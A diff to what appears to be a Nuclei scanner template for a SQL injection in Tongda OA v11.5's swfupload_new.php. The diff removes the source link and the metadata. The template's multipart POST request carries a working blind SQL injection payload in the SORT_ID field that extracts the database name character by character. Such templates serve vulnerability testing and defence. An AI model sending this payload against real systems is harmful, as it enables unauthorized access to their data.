@@ -3,12 +3,8 @@ info:
   name: 通达OA-v115-swfupload_new-sql注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zw292geq1r4mzm4h'
+  description: ''
   tags: sqli,file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zw292geq1r4mzm4h
-    fofa: app="TDXK-通达OA"
 http:
 - raw:
   - 'POST /general/file_folder/swfupload_new.php HTTP/1.1
@@ -20,14 +16,10 @@ http:
     Accept-Encoding: gzip
 
 
-
-
     ------------GFioQpMK0vv2
 
 
     Content-Disposition: form-data; name="ATTACHMENT_ID"
-
-
 
 
     1
@@ -39,8 +31,6 @@ http:
     Content-Disposition: form-data; name="ATTACHMENT_NAME"
 
 
-
-
     1
 
 
@@ -50,8 +40,6 @@ http:
     Content-Disposition: form-data; name="FILE_SORT"
 
 
-
-
     2
 
 
@@ -59,8 +47,6 @@ http:
 
 
     Content-Disposition: form-data; name="SORT_ID"
-
-
 
 
     0 RLIKE (SELECT  (CASE WHEN (substr(database(),{i},1)={ej}) THEN 1 ELSE 0x28 END))
